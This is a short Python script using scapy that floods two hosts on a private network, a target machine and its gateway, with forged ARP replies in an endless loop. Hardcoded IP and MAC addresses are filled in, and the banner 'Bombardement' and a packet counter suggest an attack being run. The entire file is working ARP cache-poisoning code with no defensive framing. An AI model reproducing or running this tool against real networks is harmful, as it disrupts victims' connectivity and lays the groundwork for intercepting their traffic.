import scapy.all as sc
from time import sleep


def poison(ipv4Target,gatewayTarget,macTarget):
    packet = sc.ARP(op = 2, pdst = ipv4Target, psrc = gatewayTarget, hwdst = macTarget, hwsrc = macTarget)
    sc.send(packet, verbose = False) 
    #print(packet)


ipv4Target = "192.168.26.61"
gatewayTarget = "192.168.26.93"
macTarget = "74:4c:a1:7a:99:c9"
macGateway = "d6:f1:31:c7:b4:6a"
print("- - - - -Bombardement ✈️- - - - -")
k = 0
try:
    while True:
        poison(ipv4Target,gatewayTarget,macTarget)
        poison(gatewayTarget,ipv4Target,macGateway)
        k += 1
except KeyboardInterrupt:
    print(k,"paquets envoyés")